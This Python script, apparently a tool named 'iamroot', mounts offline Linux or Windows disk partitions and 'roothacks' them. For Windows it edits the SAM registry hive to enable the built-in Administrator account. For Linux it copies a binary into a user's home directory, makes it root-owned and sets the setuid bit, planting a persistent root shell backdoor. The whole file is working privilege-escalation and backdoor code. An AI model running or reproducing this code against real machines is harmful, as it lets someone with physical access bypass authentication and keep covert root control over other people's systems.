import subprocess
import glob
import random
import os as oslib

MOUNT = "/mnt/iamroot-{os}-{rng}/"

LINUX_ROOT = {
    "bin",
    "dev",
    "etc",
    "lib",
    "lost+found",
    "tmp",
    "usr"
}
WINDOWS_ROOT = {
    "Windows",
    "Users"
}

def run(cmd):
    return subprocess.check_output(cmd, shell=True, stderr=open("/dev/null", "w")).decode("utf-8").rstrip("\n")

def joinparts(lst, maxparts, joiner=" "):
    return lst[:maxparts-1] + [joiner.join(lst[maxparts-1:])]

def get_partitions():
    # Please forgive me for this shitcode
    # Just never look here again
    fdisk = run("sudo fdisk -l")
    line_splits = 0
    partition_table = False
    partitions = []
    current_disk = ""
    for line in fdisk.split("\n"):
        if line.startswith("Disk /dev"):
            current_disk = line[4:line.find(":")]
        if not line or line.isspace():
            line_splits += 1
            if line_splits > 1:
                partition_table = False
                line_splits = 1
            continue
        if partition_table:
            if line:
                partitions.append(current_disk + " " + line)
        if line_splits == 1 and line.startswith("Device"):
            line_splits = 0
            partition_table = True
    partitions = [
        joinparts(list(filter(lambda i: i != '', i.split(" "))), 7) for i in partitions
    ]
    return partitions

def get_mounts(device):
    try:
        return run("findmnt -nr -o target -S "+device).split("\n")
    except subprocess.CalledProcessError:
        return []

def get_toolkit_mounts():
    return glob.glob(MOUNT.format(os="*", rng="*"))

def mount_device(os, device):
    target = MOUNT.format(os=os, rng=random.randint(1, 256))
    oslib.makedirs(target, exist_ok=True)
    run("mount "+device+" "+target)
    return target

def is_linux(device):
    try:
        ls_output = run("debugfs -R \"ls -l\" "+device)
    except subprocess.CalledProcessError as e:
        print(e)
        return False
    ls_lines = ls_output.split("\n")
    ls_contents = set([i.split(" ")[-1] for i in ls_lines])
    if LINUX_ROOT.intersection(ls_contents) == LINUX_ROOT: # LINUX_ROOT is fully contained in ls_contents
        return True
    else:
        return False

def is_windows(device):
    try:
        ls_output = run("sudo ntfsls -f "+device)
    except subprocess.CalledProcessError as e:
        print(e)
        return False
    ls_contents = ls_output.split("\n")
    if WINDOWS_ROOT.intersection(ls_contents) == WINDOWS_ROOT: # WINDOWS_ROOT is fully contained in ls_contents
        return True
    else:
        return False

def roothack_windows(mountpoint):
    print("Windows roothack")
    HKLM_Sam_Hive = oslib.path.join(mountpoint, "Windows/System32/config/SAM")
    print("Hive:", HKLM_Sam_Hive)
    print("Exporting elevated admin...")
    export = run(rf"hivexregedit --export {HKLM_Sam_Hive} 'SAM\Domains\Account\Users\000001F4'")
    values = export.split("\n")
    f = None
    for value in values:
        if value.startswith("\"F\"="):
            f = value[4:]
    bts = f.split(":", maxsplit=1)[1].split(",")
    print("Value:", bts)
    enabled = bts[56]
    if enabled == "10":
        print("System is already roothacked")
        if input("Do you wand to remove it (N/y)? ").lower() == "y":
            print("Creating temp.reg...")
            bts[56] = "11"
            contents = fr"""
[\SAM\Domains\Account\Users\000001F4]
"F"=hex(3):{",".join(bts)}
    """
            with open("temp.reg", "w") as f:
                f.write(contents)
            print("Writing...")
            run(rf"hivexregedit --merge {HKLM_Sam_Hive} temp.reg")
            print("Ceaning up...")
            oslib.remove("temp.reg")
            print("Disabled ElevatedAdmin")
        exit(0)
    if enabled != "11" and enabled != "10":
        print("Elevated Admin user is corrupted.")
        if input("Try to recover (The system may be damaged!) (N/y)? ").lower() == "y":
            enabled = "11"
        else:
            exit(1)
    if enabled == "11":
        print("Creating temp.reg...")
        bts[56] = "10"
        contents = fr"""
[\SAM\Domains\Account\Users\000001F4]
"F"=hex(3):{",".join(bts)}
"""
        with open("temp.reg", "w") as f:
            f.write(contents)
        print("Writing...")
        run(rf"hivexregedit --merge {HKLM_Sam_Hive} temp.reg")
        print("Ceaning up...")
        print("Enabled EvelatedAdmin")
        oslib.remove("temp.reg")

def run_chroot(chroot, cmd):
    proc = subprocess.Popen(f"sudo chroot {chroot} {cmd}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.wait()
    out, err = proc.communicate()
    if err:
        raise RuntimeError(err)
    return out.decode("utf-8")

def roothack_linux(mountpoint):
    print("Linux roothack")
    print("Loading users...")
    uid_min = int(run_chroot(mountpoint, "awk '/^UID_MIN/ {print $2}' /etc/login.defs"))
    uid_max = int(run_chroot(mountpoint, "awk '/^UID_MAX/ {print $2}' /etc/login.defs"))
    print(f"Min UID: {uid_min}")
    print(f"Max UID: {uid_max}")
    users = []
    with open(oslib.path.join(mountpoint, "etc/passwd")) as f:
        for line in f:
            uname, passwd, uid, gid, longname, homedir, cmd = line.split(":")
            uid, gid = int(uid), int(gid)
            if uid_min <= uid <= uid_max:
                users.append((uname, homedir))
    users.append(("all", "/usr/share"))
    print(f"Found {len(users)} users")
    for ind, userdata in enumerate(users):
        username, home = userdata
        print(f"[{ind}] {username} ({home})")
    userind = int(input("Select user to give root to: "))
    user = users[userind]
    location_local = mountpoint + oslib.path.join(user[1], "iamroot")
    location_chroot = oslib.path.join(user[1], "iamroot")

    print(f"Saving to {location_local}...")
    if oslib.path.exists(location_local):
        print("System is already roothacked")
        if input("Do you wand to remove it (N/y)? ").lower() == "y":
            oslib.remove(location_local)
            print(f"Removed {location_chroot}")
        exit(0)

    with open("shell", "br") as f: executable = f.read()

    with open(location_local, "bw") as f:
        f.write(executable)

    cmd = f"sh -c \"chown root {location_chroot} & chmod ugo+rx {location_chroot} & chmod u+sx {location_chroot}\""
    print(f"chroot running> {cmd}")
    run_chroot(mountpoint, cmd)

    cmd = f"chmod u+s {location_chroot}"
    print(f"chroot running> {cmd}")
    run_chroot(mountpoint, cmd)

    print("Saved root shell at", location_chroot)

def main():
    if run("whoami") != "root":
        print("Not root")
        exit(-1)
    print("Loading existing iamroot mounts...")
    toolkit_mounts = get_toolkit_mounts()
    print(f"Found {len(toolkit_mounts)} iamroot mounts")
    if toolkit_mounts:
        for mount in toolkit_mounts:
            print("Unmounting", mount)
            if oslib.path.ismount(mount):
                run("sudo umount "+mount)
            oslib.rmdir(mount)
            print("Done")
    print("Loading partitions info...")
    partitions = get_partitions()
    print("Searching for operating systems...")
    oses = []
    for partdata in partitions:
        disk, device, start, end, sectors, size, type = partdata
        if type == "Linux filesystem":
            print("Linux compatible filesystem on", device)
            if "/" in get_mounts(device):
                print(device, "is mounted as root")
                continue
            if is_linux(device):
                print("Linux on", device)
                oses.append(("Linux", device))
        elif type == "Microsoft basic data":
            print("Windows compatible filesystem on", device)
            if is_windows(device):
                print("Windows on", device)
                oses.append(("Windows", device))
    print("=== OSs ===")
    for ind, osdata in enumerate(oses):
        os, device = osdata
        print(f"[{ind}]", os, "on", device)
    osid = int(input("Select os to roothack: "))
    os, device = oses[osid]
    mountpoint = mount_device(os, device)
    print("Mounted as", mountpoint)
    if os == "Windows":
        roothack_windows(mountpoint)
    elif os == "Linux":
        roothack_linux(mountpoint)
    

if __name__ == "__main__":
    main()